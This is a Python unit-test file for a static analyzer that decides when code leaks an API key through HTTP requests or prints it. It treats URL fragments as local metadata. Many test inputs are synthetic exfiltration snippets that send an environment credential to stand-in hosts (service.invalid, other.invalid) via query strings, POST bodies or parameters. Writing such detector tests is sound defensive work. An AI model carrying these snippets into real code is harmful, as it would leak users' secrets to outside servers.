"""HTTP URL fragments are local metadata, not outbound request targets."""

import unittest
from urllib.request import Request

from test_qindun_certify import MODULE

analyze = MODULE._python_flow_findings
PREFIX = 'import os, requests, urllib.request\nkey=os.getenv("API_KEY")\n'


class PythonHttpFragmentTests(unittest.TestCase):
    def check(self, source, expected=(), output=False):
        findings, error = analyze('main.py', PREFIX + source)
        self.assertIsNone(error)
        self.assertEqual({f.disposition for f in findings
                          if f.rule_id == 'QINDUN.D3.CREDENTIAL_EXFILTRATION'}, set(expected))
        self.assertEqual(any(f.rule_id == 'QINDUN.D5.CREDENTIAL_OUTPUT'
                             for f in findings), output)

    def test_request_target_excludes_fragment_without_network(self):
        req = Request('https://service.invalid/api#token=SYNTHETIC_SENTINEL')
        self.assertEqual(req.selector, '/api')
        self.assertIn('SYNTHETIC_SENTINEL', req.full_url)

    def test_fragment_forms_and_metadata(self):
        expressions = [
            'f"https://service.invalid/api#local={key}"',
            '"https://service.invalid/api#local={}".format(key)',
            '"https://service.invalid/api#local=" + key',
            'f"http://service.invalid/api#local={key}"',
        ]
        for expression in expressions:
            for mode in ('inline', 'named', 'request', 'log', 'request_log', 'body', 'mixed'):
                with self.subTest(expression=expression, mode=mode):
                    source = f'url={expression}\n'
                    expected, output = (), False
                    if mode == 'inline':
                        source += f'requests.get({expression})\n'
                    elif mode in ('request', 'request_log'):
                        source += 'req=urllib.request.Request(url)\nurllib.request.urlopen(req)\n'
                        if mode == 'request_log':
                            source += 'print(req.full_url)\n'
                            output = True
                    elif mode == 'body':
                        source += 'requests.post("https://other.invalid",data=url)\n'
                        expected = ('confirmed',)
                    else:
                        source += 'requests.get(url)\n'
                        if mode == 'log':
                            source += 'print(url)\n'
                            output = True
                        elif mode == 'mixed':
                            source += 'requests.post("https://other.invalid",data=key)\n'
                            expected = ('confirmed',)
                    self.check(source, expected, output)

    def test_prefix_and_unproved_components_remain_actionable(self):
        cases = [
            ('requests.get(f"https://service.invalid/?dump={key}#local={key}")', ('confirmed',)),
            ('requests.get(f"https://service.invalid/?key={key}#local={key}")', ('candidate',)),
            ('requests.get(f"https://service.invalid/%23local={key}")', ('confirmed',)),
            ('requests.get(f"https://{key}.invalid/#public")', ('confirmed',)),
            ('requests.get(f"https://{host}/#local={key}")', ('confirmed',)),
            ('requests.get(f"custom://service.invalid/#local={key}")', ('confirmed',)),
            ('requests.get(transform(f"https://service.invalid/#local={key}"))', ('confirmed',)),
            ('requests.post(f"https://service.invalid/#local={key}",json={"secret":key})', ('confirmed',)),
            ('requests.get(f"https://service.invalid/#local={key}",params={"dump":key})', ('confirmed',)),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                self.check(source, expected)

    def test_alias_branch_return_and_rebinding(self):
        cases = [
            ('url=f"https://service.invalid/#local={key}"\nold=url\nurl=key\nrequests.get(old)', ()),
            ('url=f"https://service.invalid/#local={key}"\nurl=f"https://service.invalid/?dump={key}"\nrequests.get(url)', ('confirmed',)),
            ('def build(secret):\n    return f"https://service.invalid/#local={secret}"\nrequests.get(build(key))', ()),
            ('def send(url):\n    requests.get(url)\nsend(f"https://service.invalid/#local={key}")', ()),
            ('if choose:\n    url=f"https://service.invalid/#local={key}"\nelse:\n    url=f"https://service.invalid/?dump={key}"\nrequests.get(url)', ('confirmed',)),
            ('part="fixed#local"\nrequests.get(f"https://service.invalid/{part}?key={key}")', ()),
            ('part=os.getenv("MODEL")\nrequests.get(f"https://service.invalid/{part}?key={key}")', ('confirmed',)),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                self.check(source, expected)

    def test_http_url_argument_positions_and_raw_metadata(self):
        calls = [
            'requests.request("GET",url)',
            'requests.request(method="GET",url=url)',
            'import httpx\nhttpx.request("GET",url)',
            'import urllib3\nurllib3.request("GET",url)',
            'session=requests.Session()\nsession.request("GET",url)',
            'urllib.request.urlopen(url=url)',
            'req=urllib.request.Request(full_url=url)\nurllib.request.urlopen(req)',
        ]
        for call in calls:
            with self.subTest(call=call):
                self.check('url=f"https://service.invalid/#local={key}"\n' + call)
                self.check('url=f"https://service.invalid/?dump={key}#public"\n' + call,
                           ('confirmed',))
        self.check('url=f"https://service.invalid/#local={key}"\n'
                   'req=urllib.request.Request(full_url=url)\n'
                   'urllib.request.urlopen(req)\nprint(req.full_url)', output=True)
        self.check('requests.get("https://service.invalid/api?key={0}#fragment".format(key))',
                   ('candidate',))


if __name__ == '__main__':
    unittest.main()
